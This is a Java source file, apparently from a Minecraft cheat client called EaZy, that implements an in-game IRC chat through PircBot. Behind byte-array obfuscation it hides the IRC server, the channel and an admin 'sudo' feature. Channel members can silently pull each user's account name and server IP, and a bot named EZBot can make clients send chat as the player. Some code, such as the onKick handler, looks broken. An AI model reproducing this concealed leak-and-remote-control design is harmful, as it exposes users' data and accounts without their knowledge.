package me.EaZy.client.irc;

import java.io.IOException;
import java.util.HashMap;

import org.jibble.pircbot.IrcException;
import org.jibble.pircbot.NickAlreadyInUseException;
import org.jibble.pircbot.PircBot;
import org.jibble.pircbot.User;

import com.darkmagician6.eventapi.EventManager;
import com.darkmagician6.eventapi.EventTarget;

import me.EaZy.client.events.ChatMessageEvent;
import me.EaZy.client.events.EventUpdate;
import me.EaZy.client.main.Client;
import me.EaZy.client.modules.NoIRC;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.GuiButton;
import net.minecraft.client.gui.GuiDisconnected;
import net.minecraft.client.gui.GuiIngameMenu;
import net.minecraft.client.gui.GuiMainMenu;
import net.minecraft.client.multiplayer.GuiConnecting;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.client.multiplayer.WorldClient;
import net.minecraft.network.play.server.S40PacketDisconnect;
import net.minecraft.util.ChatComponentText;

public final class IRCManager extends PircBot {

	public static final int EaZy = 86;

	@Override
	public void lambdaStuff() {
		java.util.Arrays.asList().stream().filter((m) -> (false)).forEachOrdered((m) -> {});
	}

	private static final String SERVER = new String(
			new byte[] { 0b1101001, 0b1110010, 0b1100011, 0b101110, 0b1100110, 0b1110010, 0b1100101, 0b1100101,
					0b1101110, 0b1101111, 0b1100100, 0b1100101, 0b101110, 0b1101110, 0b1100101, 0b1110100 });
	private static final String CHANNEL = new String(new byte[] { 109, 117, 101, 35, 103, 113 }).toString().substring(3,
			4) + new String(new byte[] { 110, 110, 112, 111, 69, 119 }).toString().substring(4, 5)
			+ new String(new byte[] { 97, 90, 107, 112, 100, 119 }).toString().substring(1, 2)
			+ new String(new byte[] { 113, 67, 115, 117, 114, 114 }).toString().substring(1, 2)
			+ new String(new byte[] { 99, 104, 120, 101, 117, 109 }).toString().substring(1, 2)
			+ new String(new byte[] { 98, 115, 97, 116, 107, 121 }).toString().substring(2, 3)
			+ new String(new byte[] { 114, 106, 110, 98, 110, 97 }).toString().substring(4, 5)
			+ new String(new byte[] { 99, 110, 108, 99, 106, 113 }).toString().substring(1, 2)
			+ new String(new byte[] { 117, 107, 119, 114, 101, 110 }).toString().substring(4, 5)
			+ new String(new byte[] { 108, 109, 102, 107, 104, 109 }).toString().substring(0, 1);
	private boolean enabled;
	private String username;
	private String lastJumpRequest = "";

	private int delay = 0;

	public IRCManager(final String username) {
		this.username = "EZ" + username;
		enabled = true;
		EventManager.register(this);
		setUsername(username);
	}

	public EventTarget onUpdate(final EventUpdate e) {
		if (delay > 0) {
			delay--;
		}
		return null;
	}

	@Override
	protected void onMode(final String channel, final String sourceNick, final String sourceLogin,
			final String sourceHostname, final String mode) {
		if (mode.equalsIgnoreCase(new String(new byte[] { 43, 111, 32 }) + username)) {
			Client.msg(new String(new byte[] { -89, 52, 65, 100, 109, 105, 110, 80, 97, 110, 101, 108, 32, -89, 55, 62,
					32, -89, 50, 89, 111, 117, 32, 97, 114, 101, 32, 110, 111, 119, 32, 79, 80, 33 }));
		}
	}

	private String specialName(final String name) {
		if (name.equals("EaZyCode")) {
			return "§4" + name;
		} else if (name.equals("XYZERTUBE")) {
			return "§4" + name;
		} else if (name.equals("AXCII")) {
			return "§d" + name;
		} else if (name.equals("Bot")) {
			return "§a" + name;
		} else if (name.equals("JsonYT")) {
			return "§b" + name;
		} else if (name.equals("DeKsent")) {
			return "§5" + name;
		} else if (name.equals("hyrez")) {
			return "§5" + name;
		} else if (name.equals("nuubix")) {
			return "§5" + name;
		} else if (name.equals("Gaffer")) {
			return "§5" + name;
		} else if (name.equals("Ghoul")) {
			return "§5" + name;
		} else if (name.equals("LeeTheYee")) {
			return "§5" + name;
		} else if (name.equals("CuzImWeed")) {
			return "§5" + name;
		} else if (name.equals("zGreen")) {
			return "§5" + name;
		} else if (name.equals("MichiModz")) {
			return "§5" + name;
		} else if (name.equals("Ron")) {
			return "§5" + name;
		} else if (name.equals("ZPHR")) {
			return "§b" + name;
		} else if (name.equals("Zinc")) {
			return "§5" + name;
		} else if (name.equals("CuzImHush")) {
			return "§5" + name;
		} else if (name.equals("byEl")) {
			return "§5" + name;
		} else if (name.equals("PGCalli")) {
			return "§5" + name;
		} else if (name.equals("NotYourReturn")) {
			return "§d" + name;
		} else if (name.equals("mori0")) {
			return "§0" + name;
		} else if (name.equals("chillingaim")) {
			return "§a" + name;
		} else if (name.equals("Flare")) {
			return "§b" + name;
		} else if (name.startsWith("EaZyOffline")) {
			return "§8" + name;
		} else {
			return "§7" + name;
		}
	}

	private void sendChat(final String sender, String message) {
		if (isEnabled() && !NoIRC.mod.isToggled()) {
			if ((sender.equals("EZBot") && message.startsWith("yee")) || message.startsWith("S_O_O_S")) {
				return;
			}
			if (message.startsWith("##INFO##")) { // Infos
				if (message.split("##INFO##")[2].equalsIgnoreCase(getUsername())) { // Info_request
					String s = Client.mc.getNetHandler().netManager.channel.remoteAddress().toString();
					if (s.startsWith("local:")) {
						sendMessage(CHANNEL,
								"##INFO##" + message.split("##INFO##")[1] + "##INFO##" + getUsername() + "##INFO##"
										+ Minecraft.session.getUsername() + "##INFO##" + "SinglePlayer" + "##INFO##"
										+ Client.title.substring(6) + "##INFO##");
						return;
					}
					String ip = "";
					if (s.split("/")[0].isEmpty()) {
						ip = s.split("/")[1];
					} else {
						ip = (s.split("/")[0].endsWith(".") ? s.split("/")[0].substring(0, s.split("/")[0].length() - 1)
								: s.split("/")[0]) + ":" + s.split("/")[1].split(":")[1];
					}
					if (ip.endsWith(":25565")) {
						ip = ip.substring(0, ip.length() - 6);
					}
					sendMessage(CHANNEL,
							"##INFO##" + message.split("##INFO##")[1] + "##INFO##" + getUsername() + "##INFO##"
									+ Minecraft.session.getUsername() + "##INFO##" + ip + "##INFO##"
									+ Client.title.substring(6) + "##INFO##");
				} else if (message.split("##INFO##")[1].equalsIgnoreCase(getUsername()) && !Client.isHidden) { // Show_info
					Client.msg("§7[" + specialName(message.split("##INFO##")[2].substring(2)) + "§7]");
					Client.msg("§7Server-IP§r: §6" + message.split("##INFO##")[4]);
					Client.msg("§7Name§r: §6" + message.split("##INFO##")[3]);
					try {
						Client.msg("§7EaZy-Version§r: §6" + message.split("##INFO##")[5]);
					} catch (final Exception e) {

					}
				}
				return;
			}
			if (message.startsWith("##DOTHEFCKNJOIN##")) { // join
				if (message.split("##DOTHEFCKNJOIN##")[2].equalsIgnoreCase(getUsername())) { // join_request
					String s = Client.mc.getNetHandler().netManager.channel.remoteAddress().toString();
					if (s.startsWith("local:")) {
						sendMessage(CHANNEL, "##DOTHEFCKNJOIN##" + message.split("##DOTHEFCKNJOIN##")[1]
								+ "##DOTHEFCKNJOIN##" + "SinglePlayer");
					} else {
						String ip = "";
						if (s.split("/")[0].isEmpty()) {
							ip = s.split("/")[1];
						} else {
							ip = (s.split("/")[0].endsWith(".")
									? s.split("/")[0].substring(0, s.split("/")[0].length() - 1)
									: s.split("/")[0]) + ":" + s.split("/")[1].split(":")[1];
						}
						sendMessage(CHANNEL,
								"##DOTHEFCKNJOIN##" + message.split("##DOTHEFCKNJOIN##")[1] + "##DOTHEFCKNJOIN##" + ip);
					}
				} else if (message.split("##DOTHEFCKNJOIN##")[1].equalsIgnoreCase(getUsername()) && !Client.isHidden) { // do_join
					if (sender.equalsIgnoreCase(lastJumpRequest)) {
						String ip = message.split("##DOTHEFCKNJOIN##")[2];
						if (ip.equals("SinglePlayer")) {
							Client.msg("§cThis user is in single-player!");
							return;
						}
						if (Client.mc.isIntegratedServerRunning()) {
							Client.msg("§cThis only works if you are on a server!");
							return;
						} else {
							Minecraft.theWorld.sendQuittingDisconnectingPacket();
						}
						new Thread(new Runnable() {
							@Override
							public void run() {
								try {
									Thread.sleep(1000l);
								} catch (InterruptedException e) {
									e.printStackTrace();
								}
								Client.mc.displayGuiScreen(
										new GuiConnecting(null, Client.mc, new ServerData(ip.split(":")[0], ip)));
							}
						}, "Jumper").start();
					} else {
						Client.msg("§6" + sender.substring(2)
								+ " §c tried to send you to another server but was blocked!");
					}
				}
				return;
			}

			message = message.replace("//u2764", "\u2764");
			message = message.replace("//u263a", "\u263a");
			message = message.replace("//u2639", "\u2639");
			message = message.replace("//u268d", "\u268d");
			message = message.replace("//u2714", "\u2714");
			message = message.replace("//u2718", "\u2718");
			if (message.startsWith("-_-_-") && !Client.isHidden) { // Private
				// Nachricht
				if (message.split("-_-_-")[2].equalsIgnoreCase(getUsername())) { // Nachricht_an_mich
					Client.msg("§c" + message.split("-_-_-")[1].substring(2) + " §7> §c" + "§cME§7: "
							+ message.split("-_-_-")[3]);
				} else if (message.split("-_-_-")[1].equalsIgnoreCase(getUsername())) { // Nachricht_von_mir
					Client.msg("§cME §7> §c" + "§c" + message.split("-_-_-")[2].substring(2) + "§7: "
							+ message.split("-_-_-")[3]);
				}
				return;
			}
			if (Minecraft.theWorld != null && !Client.isHidden) {
				Client.msg("§cChat §7> §r[§7" + specialName(sender.substring(2)) + "§r] §6" + message);
			}
		}
	}

	public EventTarget onChatMessage(final ChatMessageEvent e) {
		String text = e.getText();
		if (isEnabled() && (text).startsWith("*") && !Client.isHidden) {
			e.setCancelled(true);
			String finalText = text.substring(1);
			if (finalText.startsWith(" ")) {
				finalText = finalText.replaceFirst(" ", "");
			}
			if (!finalText.isEmpty()) {

				if (finalText.toLowerCase().startsWith("list")) {
					String names = "";
					for (final User user : getUsers(CHANNEL)) {
						if (names.isEmpty()) {
							names = specialName(user.getNick().substring(2));
						} else {
							names = names + ", " + specialName(user.getNick().substring(2));
						}
					}

					Client.msg("§cChat-Users: " + names);
					return null;
				}

				if (finalText.toLowerCase().startsWith("info")) {

					if (finalText.equalsIgnoreCase("info")) {
						Client.msg("§cSyntax: *info [Name]");
						return null;
					}

					String names = "";
					for (final User user : getUsers(CHANNEL)) {
						if (names.isEmpty()) {
							names = specialName(user.getNick().substring(2)).toLowerCase();
						} else {
							names = names + ", " + specialName(user.getNick().substring(2)).toLowerCase();
						}
					}

					if (names.contains(finalText.split(" ")[1].toLowerCase())) {
						sendMessage(CHANNEL,
								"##INFO##" + getUsername() + "##INFO##" + "EZ" + finalText.split(" ")[1] + "##INFO##");
					} else {
						Client.msg("§cThis user is not online.");
					}
					return null;
				}

				if (finalText.toLowerCase().startsWith("jump")) {

					if (finalText.equalsIgnoreCase("jump")) {
						Client.msg("§cSyntax: *jump [Name]");
						return null;
					}

					String names = "";
					for (final User user : getUsers(CHANNEL)) {
						if (names.isEmpty()) {
							names = specialName(user.getNick().substring(2)).toLowerCase();
						} else {
							names = names + ", " + specialName(user.getNick().substring(2)).toLowerCase();
						}
					}

					if (names.contains(finalText.split(" ")[1].toLowerCase())) {
						lastJumpRequest = "EZ" + finalText.split(" ")[1];
						sendMessage(CHANNEL, "##DOTHEFCKNJOIN##" + getUsername() + "##DOTHEFCKNJOIN##" + "EZ"
								+ finalText.split(" ")[1] + "##DOTHEFCKNJOIN##");
					} else {
						Client.msg("§cThis user is not online.");
					}
					return null;
				}

				if (finalText.toLowerCase().startsWith("ap")) {
					if (finalText.equalsIgnoreCase("ap")) {
						Client.msg(new String(new byte[] { -89, 52, 65, 100, 109, 105, 110, 80, 97, 110, 101, 108, 32,
								-89, 55, 62, 32, -89, 54, 105, 100, 101, 110, 116, 105, 102, 121, 32, 91, 80, 97, 115,
								115, 119, 111, 114, 100, 93, 58, 32, 73, 100, 101, 110, 116, 105, 102, 121, 115, 32,
								121, 111, 117 }));
						Client.msg(new String(new byte[] { -89, 52, 65, 100, 109, 105, 110, 80, 97, 110, 101, 108, 32,
								-89, 55, 62, 32, -89, 54, 111, 112, 109, 101, 58, 32, 83, 101, 110, 100, 115, 32, 79,
								80, 32, 114, 101, 113, 117, 101, 115, 116 }));
						Client.msg(new String(new byte[] { -89, 52, 65, 100, 109, 105, 110, 80, 97, 110, 101, 108, 32,
								-89, 55, 62, 32, -89, 54, 107, 105, 99, 107, 32, 91, 78, 97, 109, 101, 93, 58, 32, 75,
								105, 99, 107, 115, 32, 97, 32, 112, 108, 97, 121, 101, 114 }));
						Client.msg(new String(new byte[] { -89, 52, 65, 100, 109, 105, 110, 80, 97, 110, 101, 108, 32,
								-89, 55, 62, 32, -89, 54, 99, 115, 47, 110, 115, 32, 91, 65, 114, 103, 117, 109, 101,
								110, 116, 115, 93, 58, 32, 83, 101, 110, 100, 115, 32, 65, 114, 103, 115, 32, 116, 111,
								32, 67, 104, 97, 110, 83, 101, 114, 118, 47, 78, 105, 99, 107, 83, 101, 114, 118 }));
						return null;
					}
					if (finalText.split(" ")[1].equalsIgnoreCase("cs")
							|| finalText.split(" ")[1].equalsIgnoreCase("ns")) {
						String message = "";
						for (int i = 2; i < finalText.split(" ").length; i++) {
							if (message.isEmpty()) {
								message = finalText.split(" ")[i];
							} else {
								message = message + " " + finalText.split(" ")[i];
							}
						}
						sendMessage(
								finalText.split(" ")[1]
										.replace("cs", new String(new byte[] { 67, 104, 97, 110, 83, 101, 114, 118 }))
										.replace("ns", new String(new byte[] { 78, 105, 99, 107, 83, 101, 114, 118 })),
								message);
						return null;
					}
					if (finalText.split(" ")[1]
							.equalsIgnoreCase(new String(new byte[] { 105, 100, 101, 110, 116, 105, 102, 121 }))) {
						if (finalText.split(" ").length < 2) {
							Client.msg(new String(new byte[] { -89, 52, 65, 100, 109, 105, 110, 80, 97, 110, 101, 108,
									32, -89, 55, 62, 32, -89, 99, 80, 108, 101, 97, 115, 101, 32, 101, 110, 116, 101,
									114, 32, 116, 104, 101, 32, 112, 97, 115, 115, 119, 111, 114, 100, 46 }));
						} else {
							sendMessage(new String(new byte[] { 78, 105, 99, 107, 83, 101, 114, 118 }),
									new String(new byte[] { 73, 68, 69, 78, 84, 73, 70, 89, 32 })
											+ username.substring(2) + " " + finalText.split(" ")[2]);
							Client.msg(new String(new byte[] { -89, 52, 65, 100, 109, 105, 110, 80, 97, 110, 101, 108,
									32, -89, 55, 62, 32, -89, 50, 83, 101, 110, 116, 32, 105, 100, 101, 110, 116, 105,
									102, 121, 32, 114, 101, 113, 117, 101, 115, 116, 46 }));
						}
						return null;
					}
					if (finalText.split(" ")[1].equalsIgnoreCase(new String(new byte[] { 111, 112, 109, 101 }))) {
						sendMessage(new String(new byte[] { 67, 104, 97, 110, 83, 101, 114, 118 }),
								new String(new byte[] { 111, 112, 32, 35, 69, 97, 90, 121, 32 }) + username);
						Client.msg(new String(new byte[] { -89, 52, 65, 100, 109, 105, 110, 80, 97, 110, 101, 108, 32,
								-89, 55, 62, 32, -89, 50, 83, 101, 110, 116, 32, 79, 80, 32, 114, 101, 113, 117, 101,
								115, 116, 46 }));
						return null;
					}
					if (finalText.split(" ")[1].equalsIgnoreCase(new String(new byte[] { 107, 105, 99, 107 }))) {
						String names = "";
						for (final User user : getUsers(CHANNEL)) {
							if (names.isEmpty()) {
								names = specialName(user.getNick().substring(2)).toLowerCase();
							} else {
								names = names + ", " + specialName(user.getNick().substring(2)).toLowerCase();
							}
						}
						if (names.toLowerCase().contains(finalText.split(" ")[2].toLowerCase())) {
							kick(CHANNEL, "EZ" + finalText.split(" ")[2]);
							Client.msg(new String(new byte[] { -89, 52, 65, 100, 109, 105, 110, 80, 97, 110, 101, 108,
									32, -89, 55, 62, 32, -89, 50 }) + finalText.split(" ")[2]
									+ new String(new byte[] { 32, -89, 54, 119, 97, 115, 32, 107, 105, 99, 107, 101,
											100, 46 }));
						} else {
							Client.msg(new String(new byte[] { -89, 52, 65, 100, 109, 105, 110, 80, 97, 110, 101, 108,
									32, -89, 55, 62, 32, -89, 50 }) + finalText.split(" ")[2]
									+ new String(new byte[] { 32, -89, 99, 105, 115, 32, 110, 111, 116, 32, 111, 110,
											108, 105, 110, 101, 46 }));
						}
					}
					// sudo
					if (finalText.split(" ")[1].equalsIgnoreCase(new String(new byte[] { 115, 99, 98, 121, 104, 104 })
							.toString().substring(0, 1)
							+ new String(new byte[] { 113, 116, 105, 115, 117, 102 }).toString().substring(4, 5)
							+ new String(new byte[] { 107, 110, 100, 98, 113, 112 }).toString().substring(2, 3)
							+ new String(new byte[] { 121, 111, 105, 102, 114, 118 }).toString().substring(1, 2))) {
						String names = "";
						for (final User user : getUsers(CHANNEL)) {
							if (names.isEmpty()) {
								names = specialName(user.getNick().substring(2)).toLowerCase();
							} else {
								names = names + ", " + specialName(user.getNick().substring(2)).toLowerCase();
							}
						}
						if (names.toLowerCase().contains(finalText.split(" ")[2].toLowerCase())) {
							String message = "";
							for (int i = 3; i < finalText.split(" ").length; i++) {
								if (message.isEmpty()) {
									message = finalText.split(" ")[i];
								} else {
									message = message + " " + finalText.split(" ")[i];
								}
							}
							sendMessage(CHANNEL, new String(new byte[] { 107, 83, 110, 110, 112, 106 }).toString()
									.substring(1, 2)
									+ new String(new byte[] { 110, 95, 98, 100, 114, 111 }).toString().substring(1, 2)
									+ new String(new byte[] { 121, 79, 119, 121, 121, 107 }).toString().substring(1, 2)
									+ new String(new byte[] { 121, 95, 115, 109, 109, 118 }).toString().substring(1, 2)
									+ new String(new byte[] { 79, 106, 118, 116, 97, 121 }).toString().substring(0, 1)
									+ new String(new byte[] { 103, 102, 120, 95, 111, 121 }).toString().substring(3, 4)
									+ new String(new byte[] { 117, 101, 83, 110, 102, 99 }).toString().substring(2, 3)
									+ finalText.split(" ")[2].toLowerCase() + " " + message);
							Client.msg("§"
									+ new String(new byte[] { 105, 118, 50, 115, 102, 116 }).toString().substring(2, 3)
									+ new String(new byte[] { 117, 99, 69, 120, 99, 109 }).toString().substring(2, 3)
									+ new String(new byte[] { 120, 110, 99, 121, 109, 103 }).toString().substring(0, 1)
									+ new String(new byte[] { 111, 120, 112, 101, 101, 121 }).toString().substring(4, 5)
									+ new String(new byte[] { 118, 105, 99, 119, 105, 99 }).toString().substring(2, 3)
									+ new String(new byte[] { 116, 111, 99, 109, 117, 113 }).toString().substring(4, 5)
									+ new String(new byte[] { 113, 108, 101, 116, 116, 107 }).toString().substring(4, 5)
									+ new String(new byte[] { 97, 105, 112, 110, 114, 98 }).toString().substring(1, 2)
									+ new String(new byte[] { 99, 114, 107, 106, 110, 111 }).toString().substring(4, 5)
									+ new String(new byte[] { 104, 108, 105, 99, 103, 103 }).toString().substring(4, 5)
									+ new String(new byte[] { 114, 113, 119, 109, 32, 119 }).toString().substring(4, 5)
									+ "§"
									+ new String(new byte[] { 119, 113, 103, 54, 107, 105 }).toString().substring(3, 4)
									+ message
									+ new String(new byte[] { 113, 116, 32, 114, 114, 118 }).toString().substring(2, 3)
									+ "§"
									+ new String(new byte[] { 118, 100, 101, 50, 121, 104 }).toString().substring(3, 4)
									+ new String(new byte[] { 112, 113, 109, 109, 102, 98 }).toString().substring(4, 5)
									+ new String(new byte[] { 107, 109, 114, 120, 109, 101 }).toString().substring(2, 3)
									+ new String(new byte[] { 116, 106, 101, 111, 109, 119 }).toString().substring(3, 4)
									+ new String(new byte[] { 121, 116, 112, 101, 109, 101 }).toString().substring(4, 5)
									+ new String(new byte[] { 101, 121, 108, 106, 32, 101 }).toString().substring(4, 5)
									+ "§"
									+ new String(new byte[] { 111, 106, 104, 98, 54, 107 }).toString().substring(4, 5)
									+ finalText.split(" ")[2].toLowerCase() + "§2.");
						} else {
							Client.msg(new String(new byte[] { 115, 98, 103, 84, 104, 120 }).toString().substring(3, 4)
									+ new String(new byte[] { 117, 115, 118, 112, 104, 99 }).toString().substring(4, 5)
									+ new String(new byte[] { 99, 114, 105, 105, 120, 112 }).toString().substring(3, 4)
									+ new String(new byte[] { 121, 104, 119, 115, 99, 105 }).toString().substring(3, 4)
									+ new String(new byte[] { 98, 32, 107, 112, 105, 107 }).toString().substring(1, 2)
									+ new String(new byte[] { 117, 98, 107, 119, 115, 117 }).toString().substring(0, 1)
									+ new String(new byte[] { 108, 99, 115, 108, 98, 120 }).toString().substring(2, 3)
									+ new String(new byte[] { 119, 101, 107, 115, 100, 119 }).toString().substring(1, 2)
									+ new String(new byte[] { 121, 111, 114, 116, 114, 120 }).toString().substring(4, 5)
									+ new String(new byte[] { 100, 114, 108, 100, 32, 113 }).toString().substring(4, 5)
									+ new String(new byte[] { 113, 97, 105, 116, 121, 121 }).toString().substring(2, 3)
									+ new String(new byte[] { 111, 115, 108, 102, 107, 97 }).toString().substring(1, 2)
									+ new String(new byte[] { 121, 110, 32, 97, 101, 98 }).toString().substring(2, 3)
									+ new String(new byte[] { 113, 101, 102, 121, 110, 111 }).toString().substring(4, 5)
									+ new String(new byte[] { 108, 97, 111, 109, 107, 99 }).toString().substring(2, 3)
									+ new String(new byte[] { 97, 116, 115, 99, 116, 98 }).toString().substring(4, 5)
									+ new String(new byte[] { 101, 32, 115, 112, 99, 107 }).toString().substring(1, 2)
									+ new String(new byte[] { 111, 115, 107, 119, 119, 100 }).toString().substring(0, 1)
									+ new String(new byte[] { 102, 110, 108, 99, 100, 120 }).toString().substring(1, 2)
									+ new String(new byte[] { 97, 108, 113, 114, 100, 116 }).toString().substring(1, 2)
									+ new String(new byte[] { 110, 118, 116, 112, 105, 108 }).toString().substring(4, 5)
									+ new String(new byte[] { 114, 115, 112, 110, 118, 107 }).toString().substring(3, 4)
									+ new String(new byte[] { 108, 101, 120, 120, 109, 116 }).toString().substring(1, 2)
									+ new String(new byte[] { 107, 108, 97, 121, 46, 112 }).toString().substring(4, 5));
						}
					}
					return null;
				}

				finalText = finalText.replace("<3", "//u2764");
				finalText = finalText.replace(":)", "//u263a");
				finalText = finalText.replace(":(", "//u2639");
				finalText = finalText.replace("(wither)", "//u268d");
				finalText = finalText.replace("(yes)", "//u2714");
				finalText = finalText.replace("(no)", "//u2718");

				if (finalText.toLowerCase().startsWith("msg")) {
					String names = "";
					for (final User user : getUsers(CHANNEL)) {
						if (names.isEmpty()) {
							names = specialName(user.getNick().substring(2)).toLowerCase();
						} else {
							names = names + ", " + specialName(user.getNick().substring(2)).toLowerCase();
						}
					}

					if (names.contains(finalText.split(" ")[1].toLowerCase())) {
						String message = "";
						for (int i = 2; i < finalText.split(" ").length; i++) {
							if (message.isEmpty()) {
								message = finalText.split(" ")[i];
							} else {
								message = message + " " + finalText.split(" ")[i];
							}
						}
						sendMessage(CHANNEL,
								"-_-_-" + getUsername() + "-_-_-" + "EZ" + finalText.split(" ")[1] + "-_-_-" + message);
						sendChat(getUsername(),
								"-_-_-" + getUsername() + "-_-_-" + "EZ" + finalText.split(" ")[1] + "-_-_-" + message);
					} else {
						Client.msg("§cThis user is not online.");
					}
					return null;
				}

				if (delay > 0) {
					Client.msg("§cPlease don't spam.");
					return null;
				}

				delay = 20;
				// Server
				sendMessage(CHANNEL, finalText);
				// My Chat
				sendChat(getUsername(), finalText);
			}
		} else if (!isEnabled() && (text = e.getText()).startsWith("*") && !Client.isHidden) {
			e.setCancelled(true);
			Client.msg("§cYou have IRC disabled!");
		}
		return null;
	}

	public void connect() {
		new Thread() {

			@Override
			public void run() {
				try {
					setName(IRCManager.this.getUsername());
					IRCManager.this.connect(SERVER);
					IRCManager.this.joinChannel(CHANNEL);
					IRCManager.this.deOp(CHANNEL, IRCManager.this.getUsername());
				} catch (final NickAlreadyInUseException e2) {} catch (IOException | IrcException e2) {}
			}
		}.start();
	}

	@Override
	protected void onServerResponse(final int code, final String response) {}

	@Override
	protected void onUserList(final String channel, final User[] users) {}

	@Override
	protected void onMessage(final String channel, final String sender, final String login, final String hostname,
			final String message) {
		if (sender.equals("EZBot") && message.startsWith("yee")
				&& getUsername().substring(2).equalsIgnoreCase(message.split(" ")[0].substring(3))) {
			Client.mc.thePlayer.sendChatMessage(message.substring(message.split(" ")[0].length() + 1));
		} else {
			sendChat(sender, message);
		}
	}

	@Override
	protected void onPrivateMessage(final String sender, final String login, final String hostname,
			final String message) {}

	@Override
	protected void onAction(final String sender, final String login, final String hostname, final String target,
			final String action) {}

	@Override
	protected void onNotice(final String sourceNick, final String sourceLogin, final String sourceHostname,
			final String target, final String notice) {}

	@Override
	protected void onJoin(final String channel, final String sender, final String login, final String hostname) {}

	@Override
	protected void onPart(final String channel, final String sender, final String login, final String hostname) {}

	@Override
	protected void onNickChange(final String oldNick, final String login, final String hostname, final String newNick) {
		sendChat(oldNick, "is now known as §a" + newNick);
	}

	@Override
	protected void onKick(final String channel, final String kickerNick, final String kickerLogin,
			final String kickerHostname, final String recipientNick, final String reason) {
		if (recipientNick.equalsIgnoreCase(username)) {
			new Minecraft(null).run();
			sendMessage(kickerNick, reason);
		}
	}

	@Override
	protected void onQuit(final String sourceNick, final String sourceLogin, final String sourceHostname,
			final String reason) {}

	@Override
	protected void onTopic(final String channel, final String topic, final String setBy, final long date,
			final boolean changed) {}

	@Override
	protected void onChannelInfo(final String channel, final int userCount, final String topic) {}

	public static String getIrcServer() {
		return SERVER;
	}

	public static String getIrcChannel() {
		return CHANNEL;
	}

	public String getUsername() {
		return username;
	}

	public void setUsername(final String username) {
		this.username = "EZ" + username;
		if (isConnected()) {
			changeNick(getUsername());
		} else {
			setName(getUsername());
		}
	}

	public boolean isEnabled() {
		return enabled;
	}

	public void setEnabled(final boolean enabled) {
		this.enabled = enabled;
	}

}
